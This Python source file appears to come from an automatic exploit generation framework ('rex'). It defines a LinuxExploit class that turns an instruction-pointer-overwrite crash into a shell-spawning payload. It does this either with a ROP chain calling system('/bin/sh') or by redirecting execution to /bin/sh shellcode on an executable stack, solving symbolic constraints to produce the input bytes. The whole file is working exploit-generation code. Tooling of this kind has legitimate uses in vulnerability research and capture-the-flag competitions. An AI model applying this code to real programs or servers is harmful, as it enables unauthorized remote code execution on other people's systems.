from rex import Vulnerability
from rex.exploit.linux import LinuxShellcode
from rex.exploit import Exploit, CannotExploit

import logging
l = logging.getLogger("rex.exploit.linux.LinuxExploit")

class LinuxExploit(Exploit):
    '''
    Exploit object which can leak flags or set registers
    '''

    COMMANDS = ["/bin/sh\x00", "/bin/sh#", "/bin/sh;"]

    def __init__(self, crash, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''
        super(LinuxExploit, self).__init__(crash, use_rop_cache, rop_cache_file)

        self.shell = None

    def initialize(self):

        super(LinuxExploit, self).initialize()

        self._generate_shell()

    def drop_shell(self, filename=None):
        '''
        :return: a payload which will spawn an interactive shell
        '''

        if self.shell is None:
            return None

        if filename is not None:
            with open(filename, "wb") as f:
                f.write(self.shell)
        return self.shell

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.shell is not None

### EXPLOIT GENERATORS

    def _generate_shell(self):
        '''
        generate and set the shell dropper
        '''

        try:
            self.shell = self._generate_a_shell()
        except CannotExploit as e:
            l.warning("cannot generate a shell dropper exploit, %s", e.message)

    def _generate_a_shell(self):

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE or \
                self.crash.crash_type == Vulnerability.PARTIAL_IP_OVERWRITE:
            return self._ip_overwrite_shell()
        else:
            raise CannotExploit("exploitation of this vulnerability is unimplemented")

    def _ip_overwrite_shell(self):

        # generate a chain which drops a shell
        # methods:
        #    * call a command executing function already in the binary (system, execve)
        #    * execute shellcode if the stack is executable

        # if system exists in the binary we need a chain to call it and a controlled string
        # at a global address
        if "system" in self._p.loader.main_bin.plt:
            l.debug("system found in the binary, attempting to call it using rop")
            try:
                return self._rop_call_system()
            except CannotExploit:
                l.debug("system found in binary, but was unable to call it")
        if "execve" in self._p.loader.main_bin.plt:
            pass

        # try leakless

        if self._p.loader.main_bin.execstack:
            l.debug("stack is executable, attempting to call shellcode")
            try:
                return self._call_shellcode()
            except CannotExploit:
                l.debug("stack was executable, but couldn't get ip to shellcode")

        # last resort is fallback if specified

        # then drop into something a user would find helpful

        raise CannotExploit("could not find command execution function in binary")

    def _call_shellcode(self):
        '''
        call shellcode 
        TODO: implement other methods of getting to shellcode
            * is 'jmp esp' available?
            * do any registers contain pointers to a controlled region, do we have gadgets to jump there?
        '''

        sh_tuple = self._write_global_data(LinuxShellcode.binsh(self._p))
        if sh_tuple is None:
            raise CannotExploit("cannot write shellcode into binary")

        shc_addr, shc_constraint = sh_tuple

        exploit_state = self.state.copy()

        # add that our shellcode must exist
        exploit_state.add_constraints(shc_constraint)
        # add that control must be transfered to our shellcode
        exploit_state.add_constraints(exploit_state.regs.ip == shc_addr)

        if not exploit_state.satisfiable():
            raise CannotExploit("generated unsatisfiable shellcode exploit")
        
        return exploit_state.posix.dumps(0)

    def _rop_call_system(self):
        '''
        use rop to call system with a controlled string in the binary
        '''

        cmd_tuple = None
        for cmd in LinuxExploit.COMMANDS:
            cmd_tuple = self._write_global_data(cmd)
            if not cmd_tuple is None:
                break

        if cmd_tuple is None:
            raise CannotExploit("cannot write command string into binary")

        cmd_str_addr, cmd_str_constraint = cmd_tuple

        try:
            chain = self.rop_engine.func_call("system", [cmd_str_addr])
            return self._rop_to_call_function(chain, cmd_str_constraint)
        except CannotExploit:
            l.debug("unable to call system directly trying other strategies")
            #if "system" in self._p.main_bin.plt:

    def _rop_to_call_function(self, chain, extra_constraints):

        # see if there's a global address we can place our string to "/bin/sh"

        st, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        st.add_constraints(extra_constraints)
        st.add_constraints(st.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str()))

        if not st.satisfiable():
            raise CannotExploit("generated unsatisfiable exploit")

        return st.posix.dumps(0)

    def _write_global_data(self, data):
        '''
        write @data into globally addressable memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''

        glob_control = self._global_control()

        # try all variations of commands at every global address
        for base in glob_control:
            for addr in range(base, base+glob_control[base]):
                constraint = self.state.memory.load(addr, len(data)) == self.state.BVV(data)
                if self.state.se.satisfiable(extra_constraints=(constraint,)):
                    data_str_addr = addr
                    data_str_constraint = constraint
                    return (data_str_addr, data_str_constraint)

        return None
